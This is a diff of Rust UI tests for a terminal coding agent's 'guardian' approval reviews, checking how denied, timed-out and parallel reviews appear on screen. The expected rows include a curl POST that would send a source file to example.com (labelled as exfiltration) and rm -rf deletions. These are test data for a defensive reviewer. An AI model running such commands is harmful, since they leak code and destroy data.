@@ -30,18 +30,20 @@ fn app_server_guardian_write_stdin_denial_preserves_child_action() {
 // ORACLE chatwidget/tests/guardian.rs:162 app_server_guardian_write_stdin_approval_and_timeout_clear_review_status kind=snap owner=dialogs-pane snap=guardian_write_stdin_timed_out_history
 #[test]
 fn app_server_guardian_write_stdin_approval_and_timeout_clear_review_status() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live, chat-status): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner), the Working row does not read `ThreadPart.reviews` through `sheets::approvals::review_status` (chat-status)",
-    );
-    // oracle: a write_stdin review InProgress then Approved draws no history and no status; InProgress then TimedOut leaves
-    // one history cell (the stdin timeout) and the header Working.
-    let s = Screen::build(Owner::DialogsPane).size(80, 24).live().open();
-    // needs feed: turn started; guardian write_stdin review InProgress, Approved; InProgress, TimedOut (process 42)
-    s.assert_contains("Working");
+    // oracle: a write_stdin review InProgress then Approved draws no history and no status; InProgress then TimedOut
+    // leaves one history cell (the stdin timeout) and the header Working.
+    let s = Screen::build(Owner::DialogsPane)
+        .size(80, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/app_server_guardian_write_stdin_approval_and_timeout_clear_review_status.jsonl"
+        ))
+        .open();
     s.assert_has_row(
         r#"✗ Review timed out before codex could send input to terminal 42: "confirm\n""#,
     );
+    s.assert_absent("Request approved");
+    s.assert_absent("Reviewing approval request");
+    s.assert_contains("Working (0s • esc to interrupt)");
 }
 
 // ORACLE chatwidget/tests/guardian.rs:202 auto_review_denials_popup_lists_stored_auto_review_denials kind=snap owner=dialogs-pane snap=auto_review_denials_popup
@@ -76,17 +78,19 @@ fn guardian_denied_exec_renders_warning_and_denied_request() {
 // ORACLE chatwidget/tests/guardian.rs:328 guardian_approved_exec_is_hidden_from_history kind=snap owner=dialogs-pane snap=guardian_approved_exec_is_hidden_from_history
 #[test]
 fn guardian_approved_exec_is_hidden_from_history() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), and the approved-warning filter and the approved review are built (no cell), the chat only has to carry them",
-    );
-    // oracle: a guardian warning (approved, risk low) and an Approved assessment draw no history; the bottom pane at width 120.
+    // oracle: a guardian warning (approved, risk low) and an Approved assessment draw no history; the bottom pane
+    // at width 120 is the empty composer (its snapshot is only blank rows and the composer).
     let s = Screen::build(Owner::DialogsPane)
         .size(120, 24)
-        .live()
+        .script(include_str!(
+            "fixtures/chat_approvals_2/guardian_approved_exec_is_hidden_from_history.jsonl"
+        ))
         .open();
-    // needs feed: guardian warning "Automatic approval review approved (risk: low, authorization: high): ..."; Approved assessment
-    s.assert_snap("guardian_approved_exec_is_hidden_from_history");
+    s.assert_absent("Automatic approval review");
+    s.assert_absent("Request approved");
+    s.assert_absent("guardian-approved");
+    s.assert_absent("rm -f /tmp/guardian-approved.sqlite");
+    s.assert_absent("Reviewing approval request");
 }
 
 // ORACLE chatwidget/tests/guardian.rs:384 guardian_approved_request_permissions_clears_status_without_history kind=snap owner=dialogs-pane snap=guardian_approved_request_permissions_clears_status_without_history
@@ -128,63 +132,90 @@ fn guardian_timed_out_exec_renders_warning_and_timed_out_request() {
 // ORACLE chatwidget/tests/guardian.rs:585 app_server_guardian_review_denied_renders_denied_request_snapshot kind=snap owner=dialogs-pane snap=app_server_guardian_review_denied_renders_denied_request
 #[test]
 fn app_server_guardian_review_denied_renders_denied_request_snapshot() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner)",
-    );
-    // oracle: ItemGuardianApprovalReviewStarted then Completed (Denied, risk high) draw the denied request at width 140.
+    // The oracle's snapshot is the bottom pane with its own status line under the composer; the rows of the
+    // denied request and the running header are compared here (the turn is started by hand: `set_task_running`).
     let s = Screen::build(Owner::DialogsPane)
         .size(140, 24)
-        .live()
+        .script(include_str!(
+            "fixtures/chat_approvals_2/app_server_guardian_review_denied_renders_denied_request_snapshot.jsonl"
+        ))
         .open();
-    // needs feed: item/guardianApprovalReview started (guardian-1), completed (Denied, rationale "Would exfiltrate local source code.")
-    s.assert_snap("app_server_guardian_review_denied_renders_denied_request");
+    s.assert_screen_row_then(
+        "✗ Request denied for codex to run curl -sS -i -X POST --data-binary",
+        &[
+            "  @core/src/codex.rs https://example.com",
+            "",
+            "• Working (0s • esc to interrupt)",
+        ],
+    );
+    s.assert_absent("Reviewing approval request");
 }
 
 // ORACLE chatwidget/tests/guardian.rs:663 app_server_guardian_review_timed_out_renders_timed_out_request_snapshot kind=snap owner=dialogs-pane snap=app_server_guardian_review_timed_out_renders_timed_out_request
 #[test]
 fn app_server_guardian_review_timed_out_renders_timed_out_request_snapshot() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), `threads.rs` does not append `ThreadPart::take_history` to the transcript (chat-live, a decision item for the cells owner)",
-    );
-    // oracle: ItemGuardianApprovalReviewStarted then Completed (TimedOut) draw the timed-out request at width 140.
     let s = Screen::build(Owner::DialogsPane)
         .size(140, 24)
-        .live()
+        .script(include_str!(
+            "fixtures/chat_approvals_2/app_server_guardian_review_timed_out_renders_timed_out_request_snapshot.jsonl"
+        ))
         .open();
-    // needs feed: item/guardianApprovalReview started (guardian-1), completed (TimedOut)
-    s.assert_snap("app_server_guardian_review_timed_out_renders_timed_out_request");
+    s.assert_screen_row_then(
+        "✗ Review timed out before codex could run curl -sS -i -X POST --data-binary",
+        &[
+            "  @core/src/codex.rs https://example.com",
+            "",
+            "• Working (0s • esc to interrupt)",
+        ],
+    );
+    s.assert_absent("Reviewing approval request");
 }
 
 // ORACLE chatwidget/tests/guardian.rs:744 guardian_parallel_reviews_render_aggregate_status_snapshot kind=snap owner=dialogs-pane snap=guardian_parallel_reviews_render_aggregate_status
 #[test]
 fn guardian_parallel_reviews_render_aggregate_status_snapshot() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live, chat-status): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), the Working row does not read `ThreadPart.reviews` through `sheets::approvals::review_status` (chat-status)",
-    );
     // oracle: two InProgress reviews under a started turn draw one aggregate status at width 72.
-    let s = Screen::build(Owner::DialogsPane).size(72, 24).live().open();
-    // needs feed: turn started; guardian-1 and guardian-2 InProgress (rm -rf of two targets)
-    s.assert_snap("guardian_parallel_reviews_render_aggregate_status");
+    let s = Screen::build(Owner::DialogsPane)
+        .size(72, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/guardian_parallel_reviews_render_aggregate_status_snapshot.jsonl"
+        ))
+        .open();
+    s.assert_screen_row_then(
+        "• Reviewing 2 approval requests (0s • esc to interrupt)",
+        &[
+            "  └ • rm -rf '/tmp/guardian target 1'",
+            "    • rm -rf '/tmp/guardian target 2'",
+        ],
+    );
 }
 
 // ORACLE chatwidget/tests/guardian.rs:802 guardian_cleanup_drops_stale_reviews_and_restores_mcp_status kind=snap owner=dialogs-pane snap=guardian_goal_continuation_drops_stale_reviews
 #[test]
 fn guardian_cleanup_drops_stale_reviews_and_restores_mcp_status() {
-    kit::pending(
-        Owner::DialogsPane,
-        "needs(chat-live, chat-status): the model (core approvals::guardian), the cell words (DecisionCell) and the list rows are built and tested in core/tests/approvals.rs and tests/sheets/approvals.rs; what is left is wiring of other owners: the router does not carry guardian notifications to the slot (`screens::project_thread`, `protocol/targets.rs` notification_thread: chat-live), the turn's end must apply `ThreadEv::TurnEnded` to the slot (threads.rs `end_turn`), the Working row does not read `ThreadPart.reviews` through `sheets::approvals::review_status` (chat-status); no MCP startup status either",
-    );
     // oracle: alpha MCP starting, a stale review under turn-1, turn-1 interrupted: the header is Booting MCP server: alpha;
     // turn-2 with a current review draws the aggregate (width 72); turn-2 completes: the header is again Booting MCP server: alpha.
-    let s = Screen::build(Owner::DialogsPane).size(72, 24).live().open();
-    // needs feed: turn-1 started; mcp server alpha Starting; guardian stale-review InProgress; turn-1 interrupted
+    let mut s = Screen::build(Owner::DialogsPane)
+        .size(72, 24)
+        .script(include_str!(
+            "fixtures/chat_approvals_2/guardian_cleanup_drops_stale_reviews_and_restores_mcp_status_1.jsonl"
+        ))
+        .open();
+    s.assert_absent("stale-review");
+    s.assert_absent("Reviewing approval request");
     s.assert_contains("Booting MCP server: alpha");
-    // needs feed: turn-2 started; guardian current-review InProgress
-    s.assert_snap("guardian_goal_continuation_drops_stale_reviews");
-    // needs feed: turn-2 completed
+    s.feed(include_str!(
+        "fixtures/chat_approvals_2/guardian_cleanup_drops_stale_reviews_and_restores_mcp_status_2.jsonl"
+    ));
+    s.assert_screen_row_then(
+        "• Reviewing approval request (0s • esc to interrupt)",
+        &["  └ rm -rf '/tmp/current-review'"],
+    );
+    s.assert_absent("stale-review");
+    s.feed(include_str!(
+        "fixtures/chat_approvals_2/guardian_cleanup_drops_stale_reviews_and_restores_mcp_status_3.jsonl"
+    ));
+    s.assert_absent("Reviewing approval request");
     s.assert_contains("Booting MCP server: alpha");
 }
 
